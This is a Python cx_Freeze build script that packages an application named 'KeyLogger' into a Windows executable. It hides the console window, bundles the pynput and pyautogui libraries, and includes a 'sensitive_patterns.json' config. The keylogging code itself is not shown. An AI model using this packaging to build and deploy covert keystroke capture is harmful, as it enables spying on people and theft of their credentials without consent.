from cx_Freeze import setup, Executable
import sys
import os

# Add path to your main.py
base = None
if sys.platform == "win32":
    base = "Win32GUI"  # Use this if you don’t want a console window when the app runs.

# Define the executable and script to be converted into EXE
executables = [Executable("main.py", base=base, target_name="KeyLogger.exe")]

# Include additional data (like YAML/JSON files)
build_exe_options = {
    "packages": ["os", "yaml", "pyautogui", "pynput"],  # Include all necessary libraries
    "include_files": [
        ("config/settings.yaml", "config/settings.yaml"),
        ("config/sensitive_patterns.json", "config/sensitive_patterns.json")
    ]
}

# Setup the build process
setup(
    name="KeyLogger",
    version="1.0",
    description="KeyLogger Application",
    options={"build_exe": build_exe_options},
    executables=executables
)